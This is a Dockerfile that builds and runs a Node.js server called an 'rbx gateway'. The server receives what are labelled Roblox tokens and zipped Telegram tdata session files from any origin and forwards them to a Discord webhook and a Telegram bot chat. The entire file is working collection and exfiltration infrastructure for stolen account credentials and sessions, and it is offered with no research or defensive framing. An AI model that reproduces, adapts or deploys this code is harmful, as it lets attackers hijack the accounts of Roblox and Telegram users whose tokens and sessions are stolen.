FROM node:20-alpine

WORKDIR /app

RUN cat > server.js <<'SERVEREOF'
const http = require('http');

const PORT = process.env.PORT || 3000;
const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK;
const TG_TOKEN = process.env.TG_TOKEN;
const TG_CHAT = process.env.TG_CHAT;

function readBody(req) {
    return new Promise((resolve) => {
        const chunks = [];
        req.on('data', c => chunks.push(c));
        req.on('end', () => resolve(Buffer.concat(chunks)));
    });
}

const server = http.createServer(async (req, res) => {
    if (req.method === 'OPTIONS') {
        res.writeHead(204, {
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'POST, GET, OPTIONS',
            'Access-Control-Allow-Headers': '*'
        });
        return res.end();
    }

    // RBX token — send as file (no 2000-char limit)
    if (req.method === 'POST' && req.url === '/send') {
        const buf = await readBody(req);
        const body = buf.toString('utf8');
        console.log('rbx token received, len:', body.length);
        const jobs = [];

        if (DISCORD_WEBHOOK) {
            const form = new FormData();
            form.append('payload_json', JSON.stringify({
                content: 'RBX token (' + body.length + ' chars)'
            }));
            form.append('files[0]', new Blob([body], { type: 'text/plain' }), 'rbx_token.txt');
            jobs.push(fetch(DISCORD_WEBHOOK, { method: 'POST', body: form })
                .then(() => console.log('Discord rbx file sent'))
                .catch(e => console.log('Discord rbx err:', e)));
        }

        if (TG_TOKEN && TG_CHAT) {
            if (body.length > 4000) {
                const form = new FormData();
                form.append('chat_id', TG_CHAT);
                form.append('caption', 'RBX token (' + body.length + ' chars)');
                form.append('document', new Blob([body], { type: 'text/plain' }), 'rbx_token.txt');
                jobs.push(fetch('https://api.telegram.org/bot' + TG_TOKEN + '/sendDocument',
                    { method: 'POST', body: form })
                    .then(() => console.log('TG rbx doc sent'))
                    .catch(e => console.log('TG rbx doc err:', e)));
            } else {
                jobs.push(fetch('https://api.telegram.org/bot' + TG_TOKEN + '/sendMessage', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: 'chat_id=' + encodeURIComponent(TG_CHAT) +
                          '&text=' + encodeURIComponent('[RBX]\n' + body)
                }).catch(e => console.log('TG rbx err:', e)));
            }
        }

        await Promise.allSettled(jobs);
        res.writeHead(200, { 'Content-Type': 'text/plain' });
        return res.end('ok');
    }

    // TG tdata zip
    if (req.method === 'POST' && req.url === '/send-tdata') {
        const buf = await readBody(req);
        console.log('tdata received, size:', buf.length);
        const jobs = [];

        if (TG_TOKEN && TG_CHAT) {
            const form = new FormData();
            form.append('chat_id', TG_CHAT);
            form.append('caption', 'TG tdata session');
            form.append('document', new Blob([buf], { type: 'application/zip' }), 'tdata.zip');
            jobs.push(fetch('https://api.telegram.org/bot' + TG_TOKEN + '/sendDocument',
                { method: 'POST', body: form })
                .then(r => r.text()).then(t => console.log('TG doc:', t))
                .catch(e => console.log('TG doc err:', e)));
        }

        if (DISCORD_WEBHOOK && buf.length < 7 * 1024 * 1024) {
            const form = new FormData();
            form.append('payload_json', JSON.stringify({ content: 'TG tdata session' }));
            form.append('files[0]', new Blob([buf], { type: 'application/zip' }), 'tdata.zip');
            jobs.push(fetch(DISCORD_WEBHOOK, { method: 'POST', body: form })
                .then(() => console.log('Discord tdata sent'))
                .catch(e => console.log('Discord tdata err:', e)));
        } else if (buf.length >= 7 * 1024 * 1024) {
            console.log('tdata too big for Discord (' + buf.length + '), TG only');
        }

        await Promise.allSettled(jobs);
        res.writeHead(200, { 'Content-Type': 'text/plain' });
        return res.end('ok');
    }

    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('rbx gateway up');
});

server.listen(PORT, () => {
    console.log('rbx-gw listening on ' + PORT);
});
SERVEREOF

EXPOSE 3000

CMD ["node", "server.js"]
